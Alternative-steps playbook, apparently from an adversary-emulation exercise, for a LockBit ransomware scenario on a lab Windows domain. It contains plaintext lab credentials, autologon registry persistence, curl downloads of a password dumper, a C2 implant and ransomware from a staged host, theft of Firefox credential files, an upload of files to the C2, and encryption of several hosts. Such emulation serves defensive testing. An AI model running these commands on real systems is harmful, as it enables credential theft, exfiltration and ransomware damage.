# This is the ALTERNATIVE instruction set for the Scenario

Legend of symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something
* :biohazard: - Procedure for a given step

This document provides alternative steps to perform if a particular portion of a step fails to execute.
Due to the nature of the scenario and its components, not every part has a
corresponding alternative
step, and most alternative steps will sacrifice certain parts of the scenario,
in particular the emulated TTPs.

## Step 1 - Initial Access

### TightVNC Client Fails to Connect to quirrell

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `quirrell (10.111.9.202)`

  | Hostname | Username | Password |
  | -------- | -------- | -------- |
  | quirrell.decryptmalfoy.net | decryptmalfoy.net\gornuk | Concave-Monsieur |

* Use this RDP instead of the TightVNC for all following interactions with
`quirrell (10.111.9.202)`

## Step 2 - Execution

### Domain Discovery Commands Fail

:exclamation: No alternative steps. Proceed with executing
the PowerShell system services discovery command.

### PowerShell System Services Discovery Fails

#### :biohazard: Tier 1 Procedures

* In the VNC or RDP sesion to `quirrell (10.111.9.202)`, search for Command
Prompt and right-click to Run as Administrator

* Within the Command Prompt, execute the following to gather information about
running services:

  ```cmd
  wmic service where started=true get name, displayname, state, pathname
  ```

## Step 3 - Persistence

### Unable to Modify the Registry via GUI

* Using the elevated Command Prompt, execute the following to modify the
registry:

  ```cmd
  reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
  reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "gornuk" /f
  reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "Concave-Monsieur" /f
  reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d "decryptmalfoy" /f
  ```

## Step 4 - Credential Access

### No Choco Available or Unable to Download FireFox Password Dumper

#### :biohazard: Tier 1 Procedures

* Using the elevated Command Prompt in the VNC or RDP session to
`quirrell (10.111.9.202)`, execute the following command to download the FireFox
password dumper:

  ```cmd
  md C:\ProgramData\chocolatey\lib\FoxAdminPro\tools\
  curl http://1nvisibility-cl0ak.net/files/FoxAdminPro.exe -o C:\ProgramData\chocolatey\lib\FoxAdminPro\tools\FoxAdminPro.exe
  ```

* Return to scenario execution of the FireFox password dumper

### FireFox Password Dumper Fails to Dump Passwords

#### :biohazard: Tier 1 Procedures

* Using the elevated Command Prompt in the VNC or RDP session to
`quirrell (10.111.9.202)`, execute the following command to stage the FireFox
data for later exfiltration

  ```cmd
  copy C:\Users\gornuk\AppData\Roaming\Mozilla\Firefox\Profiles\ohbrdd1o.default-release\key4.db C:\users\public
  copy C:\Users\gornuk\AppData\Roaming\Mozilla\Firefox\Profiles\ohbrdd1o.default-release\logins.json C:\users\public
  ```

## Step 5 - Lateral Movement to Linux Server

:exclamation: No alternative steps for this.

## Step 6 - Privilege Escalation and Command & Control

### No Choco Available or Unable to Download ThunderShell

#### :biohazard: Tier 1 Procedures

* Using the elevated Command Prompt in the VNC or RDP session to
`quirrell (10.111.9.202)`, execute the following command to download
ThunderShell:

  ```cmd
  md C:\ProgramData\chocolatey\lib\Termini\tools\
  curl http://1nvisibility-cl0ak.net/files/llfehnPxfbAg.ps1 -o C:\ProgramData\chocolatey\lib\Termini\tools\termini.ps1
  ```

* Return to scenario execution of ThunderShell in PowerShell

### ThunderShell Fails to Execute

#### :biohazard: Tier 1 Procedures

* Continue using the elevated Command Prompt in the VNC or RDP session for the
remaining scenario execution

## Step 7 - Exfiltration

### No ThunderShell Available to Execute Choco

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `quirrell (10.111.9.202)` (if not
already open)

  | Username | Password |
  | -------- | -------- |
  | decryptmalfoy.net\gornuk | Concave-Monsieur |

* If no elevated command prompt is currently open, search for Command Prompt
and right-click to Run As Administrator
  
* Run the following command in the command prompt to download StealBit to
`quirrell (10.111.9.202)`

  ```cmd
  choco install connhost
  ```
  
* Run the following command in the command prompt to execute StealBit:

  ```cmd
  connhost.exe C:\Users\ -d
  ```

### No Choco available or unable to download StealBit

#### :biohazard: Tier 1 Procedures

* Switch to the ThunderShell tab and enter the following command to download
StealBit to `quirrell (10.111.9.202)`:

  ```cmd
  md C:\ProgramData\chocolatey\lib\Connhost\tools\
  curl http://1nvisibility-cl0ak.net/files/connhost.exe -o C:\ProgramData\chocolatey\lib\Connhost\tools\connhost.exe
  curl http://1nvisibility-cl0ak.net/files/connhost.exe -o C:\ProgramData\chocolatey\lib\Connhost\tools\sb.conf
  ```

### StealBit is unavailable or fails to execute

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `quirrell (10.111.9.202)` (if not
already open)

  | Username | Password |
  | -------- | -------- |
  | decryptmalfoy.net\gornuk | Concave-Monsieur |

* If no elevated command prompt is currently open, search for PowerShell and
right-click to Run As Administrator
  
* Run the following command in the PowerShell prompt on `quirrell (10.111.9.202)`

  ```cmd
  whoami /all
  ipconfig /all
  cd ~;Get-ChildItem -Recurse
  curl http://1nvisibility-cl0ak.net/files/bs/portal
  curl http://1nvisibility-cl0ak.net/files/11111000011110000 --upload-file [ALTERNATIVE FILE]
  ```

* After the file upload completes verify the file exists in the C2 server files
folder. If the file exists continue to the next step.

## Step 8 - Impact

### No ThunderShell Available to Download or Execute LockBit

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `quirrell (10.111.9.202)` (if not
already open)

  | Username | Password |
  | -------- | -------- |
  | decryptmalfoy.net\gornuk | Concave-Monsieur |

* If no elevated command prompt is currently open, search for Command Prompt
and right-click to Run As Administrator
  
* Run the following command in the command prompt to download LockBit to
`quirrell (10.111.9.202)`

  ```cmd
  choco install BlockLit -y
  ```
  
* Run the following command in the command prompt to execute LockBit:

  ```cmd
  C:\ProgramData\chocolatey\lib\BlockLit\tools\main.exe -ps
  ```
  
* Verify that the hosts were encrypted by checking the presence of the
`sk12uyqzk.README.txt` ransom note in directories.

### ThunderShell Fails to Download LockBit Using Choco

#### :biohazard: Tier 1 Procedures

* Switch to the ThunderShell tab and enter the following command to download
LockBit to `quirrell (10.111.9.202)`:

  ```cmd
  md C:\ProgramData\chocolatey\lib\BlockLit\tools\
  curl http://1nvisibility-cl0ak.net/files/bl.exe -o C:\ProgramData\chocolatey\lib\BlockLit\tools\main.exe
  ```

### LockBit Fails to Execute

#### :biohazard: Tier 1 Procedures

* If ThunderShell **is** available:
  * Switch to the ThunderShell tab and enter the following command to download
  the alternative LockBit batch script to `quirrell (10.111.9.202)`:

    ```cmd
    md C:\ProgramData\chocolatey\lib\BlockLit\tools\
    curl http://1nvisibility-cl0ak.net/files/bl.bat -o C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.bat
    ```

  * Enter the following command to download the minimal LockBit encryption
  executable to `quirrell (10.99.9.202)`:

    ```cmd
    curl http://1nvisibility-cl0ak.net/files/minimal.exe -o C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.min.exe
    ```

  * Enter the following command to execute the alternative batch script:

    ```cmd
    C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.bat C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.min.exe 10.111.9.200 10.111.9.205 10.111.9.202
    ```

* If ThunderShell **is not** available:
  * Open an elevated command prompt and run the following command to download
  the alternative LockBit batch script to `quirrell (10.111.9.202)`:

    ```cmd
    md C:\ProgramData\chocolatey\lib\BlockLit\tools\
    curl http://1nvisibility-cl0ak.net/files/bl.bat -o C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.bat
    ```

  * Enter the following command to download the minimal LockBit encryption
  executable to `quirrell (10.99.9.202)`:

    ```cmd
    curl http://1nvisibility-cl0ak.net/files/minimal.exe -o C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.min.exe
    ```

  * Enter the following command to execute the alternative batch script:

    ```cmd
    C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.bat C:\ProgramData\chocolatey\lib\BlockLit\tools\83426913-9751-4a75-b159-65f7bf232961.min.exe 10.111.9.200 10.111.9.205 10.111.9.202
    ```

* Verify that the hosts were encrypted by checking the presence of the
`sk12uyqzk.README.txt` ransom note in directories.

* Verify activity failure or success by looking at terminal output and at the
`C:\Windows\temp\bl.bat.log` log file on affected hosts.
